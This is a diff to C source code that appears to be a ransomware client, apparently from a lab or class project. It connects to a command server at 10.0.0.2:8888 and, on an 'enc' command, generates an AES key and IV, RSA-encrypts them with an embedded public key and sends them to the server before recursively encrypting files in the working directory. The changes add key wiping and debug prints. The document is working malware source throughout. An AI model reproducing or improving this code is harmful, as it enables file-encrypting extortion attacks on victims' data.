@@ -12,6 +12,7 @@
 #include <openssl/evp.h>
 #include <openssl/bio.h>
 #include <openssl/err.h>
+#include <string.h>
 
 char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
 "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuaSs3J+sdyTWIGiYOuWe\n"\
@@ -22,7 +23,9 @@ char publicKey[] = "-----BEGIN PUBLIC KEY-----\n"\
 "xqd8R5PZRhudSQGNg6UrhmlsmS1OUdmB+/9eOHVGeLeIZHNcHyc9n5OQ+W7CpZ0p\n"\
 "+wIDAQAB\n"\
 "-----END PUBLIC KEY-----\n";
+
 int padding = RSA_PKCS1_PADDING;
+
 
 
 void handleError(int sockid);
@@ -41,9 +44,6 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr);
 
 int main (int argc, char * argv[])
 {
-
-
-    
     int sockid;
     int server_port = 8888;
     char *server_ip = "10.0.0.2";
@@ -125,8 +125,11 @@ int main (int argc, char * argv[])
 	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
 
             send_key(pKey, pIv, sockid, server_addr);
-
             listdir((const char *)cwd, iv, key, 'e');
+            memset(key, 0, 33);
+            memset(iv, 0, 33);
+            memset(pKey, 0, 65);
+            memset(pIv, 0, 65);
         }
         else if (strncmp(command, "dec",3)==0)
         {
@@ -134,9 +137,7 @@ int main (int argc, char * argv[])
             getcwd(cwd, 1024);
             unsigned char key[33];
             int size;
-            int sizeKey = 33;
             unsigned char iv[33];
-            int sizeIv = 33;
             char pKey[65];
             char pIv[65];
             const char * separator = " ";
@@ -146,10 +147,12 @@ int main (int argc, char * argv[])
             strcpy(pKey, strToken);
             strToken = strtok(NULL, separator);
             strcpy(pIv, strToken);
-            size = strlen(iv);
-            iv[size-1] = '\0';  //removing \n from the iv
-            hexa_to_bytes(pKey, key,sizeKey);
-            hexa_to_bytes(pIv, iv,sizeKey);
+            size = strlen(pIv);
+            pIv[size-1] = '\0';  //removing \n from the iv
+            printf("%s\n", pKey);
+            printf("%s\n", pIv);
+            hexa_to_bytes(pKey, key,65);
+            hexa_to_bytes(pIv, iv,65);
             char response[2048];
             strcpy(response, cwd);
             strcat(response, " ");
@@ -158,7 +161,10 @@ int main (int argc, char * argv[])
 
             listdir((const char *)cwd, (unsigned char *)iv, (unsigned char *)key, 'd');
             send(sockid, (const char *)response, strlen(response)+1,0);
-    
+            memset(key, 0, 33);
+            memset(iv, 0, 33);
+            memset(pKey, 0, 65);
+            memset(pIv, 0, 65);
 
 
 
@@ -273,8 +279,9 @@ int send_key(char *pKey, char *pIv, int sockid, struct sockaddr_in server_addr)
     strcpy(msg, pKey);
     strcat(msg,":");
     strcat(msg,pIv);
-    int lenght = public_encrypt((unsigned char*)msg, strlen(msg), publicKey, encrypted);
-    send(sockid, (const char *)encrypted, strlen(encrypted)+1,0);
+    printf("%s\n", msg);
+    public_encrypt(msg, strlen(msg), publicKey, encrypted);
+    send(sockid, (const char *)encrypted, 257,0);
     free(msg);
 }
 
